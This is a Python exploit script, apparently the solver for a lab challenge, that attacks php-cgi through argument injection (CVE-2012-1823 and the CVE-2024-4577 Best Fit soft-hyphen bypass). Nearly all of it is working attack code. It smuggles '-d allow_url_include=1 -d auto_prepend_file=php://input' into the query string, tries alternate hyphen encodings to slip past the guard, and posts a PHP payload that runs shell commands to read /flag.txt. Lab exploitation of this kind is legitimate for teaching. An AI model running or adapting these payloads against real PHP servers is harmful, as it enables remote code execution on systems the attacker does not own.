#!/usr/bin/env python3
"""
16 - php-cgi argument injection (CVE-2012-1823 / CVE-2024-4577).

Stage 1 (classic, port 8016)
    The gateway turns every query string into argv.  php-cgi's own 2012 guard
    refuses `?-s`, but the guard is only armed when the query string contains
    no '=' - so we smuggle one in and the options are parsed again.

Stage 2 (worstfit, port 9016)
    The gateway is RFC 3875 correct, so the query string must not contain an
    unencoded '='.  Instead of a hyphen we send a soft hyphen (%AD): the guard
    compares the decoded byte against 0x2D and lets it through, and the
    (modelled) Windows ANSI conversion turns 0xAD into 0x2D on its way to argv.

Both stages end with `-d allow_url_include=1 -d auto_prepend_file=php://input`,
the canonical 2012 remote code execution primitive.

stdlib only.
"""

import http.client
import re
import sys
import urllib.parse

FLAG_RE = re.compile(r"PHRACK\{[^}]{1,120}\}")
PHP_PAYLOAD = (
    "<?php echo \"----\\n\", \"uid=\", trim(shell_exec('id -u')), \"\\n\","
    " shell_exec('cat /flag.txt 2>&1'), \"----\\n\"; ?>"
)

# The exact same RCE arguments, spelled twice.
CLASSIC_RCE = "-d+allow_url_include=1+-d+auto_prepend_file=php://input"
#  %AD = soft hyphen (becomes '-' through Windows Best Fit)
#  %3D = '=' , kept encoded so the gateway still treats the query as a command
#        line, exactly like the real CVE-2024-4577 payload
WORSTFIT_RCE = "%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"


def http_request(base, target, method="GET", body=None):
    """Send `target` as the raw request-URI; no re-encoding anywhere."""
    parts = urllib.parse.urlsplit(base)
    conn = http.client.HTTPConnection(parts.hostname, parts.port or 80, timeout=20)
    headers = {"User-Agent": "phrack72-lab16", "Accept": "*/*"}
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))
    try:
        conn.request(method, target, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, data.decode("utf-8", "replace")
    finally:
        conn.close()


def step(msg):
    print("[*] " + msg)


def good(msg):
    print("[+] " + msg)


def bad(msg):
    print("[-] " + msg)


def exploit(base, label, source_probe, rce_query):
    print("\n=== %s (%s) ===" % (label, base))

    step("sanity: GET / ")
    status, body = http_request(base, "/")
    if status != 200 or "Scoreboard" not in body:
        bad("unexpected landing page (status %d)" % status)
        return None
    good("scoreboard is up")

    step("the naive attempt: GET /?-s")
    status, body = http_request(base, "/?-s")
    if "<code>" in body:
        bad("?-s dumped the source - this php-cgi is missing the 2012 patch")
    else:
        good("?-s was neutralised by the CVE-2012-1823 guard (skip_getopt=1)")

    step("source disclosure: GET /%s" % source_probe)
    status, body = http_request(base, "/" + source_probe)
    if "<code>" not in body:
        bad("no syntax-highlighted source came back")
        return None
    hint = "flag lives in /flag.txt" if "flag.txt" in body else "source disclosed"
    good("argv reached php-cgi, -s dumped the script (%s)" % hint)

    step("remote code execution: POST /?%s" % rce_query)
    status, body = http_request(base, "/?" + rce_query, method="POST",
                                body=PHP_PAYLOAD)
    match = FLAG_RE.search(body)
    if not match:
        bad("no flag in the response (status %d)" % status)
        print(body[:400])
        return None
    uid = re.search(r"uid=(\d+)", body)
    good("code execution as uid=%s" % (uid.group(1) if uid else "?"))
    good("flag: " + match.group(0))
    return match.group(0)


def main():
    classic = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    worstfit = sys.argv[2] if len(sys.argv) > 2 else "http://worstfit"

    flags = []

    f = exploit(classic, "mode classic - CVE-2012-1823", "?-s+-d+phrack=72",
                CLASSIC_RCE)
    if f:
        flags.append(f)

    f = exploit(worstfit, "mode worstfit - CVE-2024-4577", "?%ADs",
                WORSTFIT_RCE)
    if f:
        flags.append(f)

    # A second Best Fit spelling, just to show the table is not a one-trick pony:
    # U+FF0D FULLWIDTH HYPHEN-MINUS (%EF%BC%8D) collapses onto '-' as well.
    step("bonus: U+FF0D instead of the soft hyphen")
    status, body = http_request(worstfit, "/?%EF%BC%8Ds")
    if "<code>" in body:
        good("U+FF0D also survives the guard and lands as '-' in argv")
    else:
        bad("U+FF0D did not map")

    print()
    if len(flags) != 2:
        bad("only %d/2 modes were exploited" % len(flags))
        return 1
    if flags[0] != flags[1]:
        bad("the two modes returned different flags: %r" % flags)
        return 1
    print("FLAG: " + flags[0])
    return 0


if __name__ == "__main__":
    sys.exit(main())
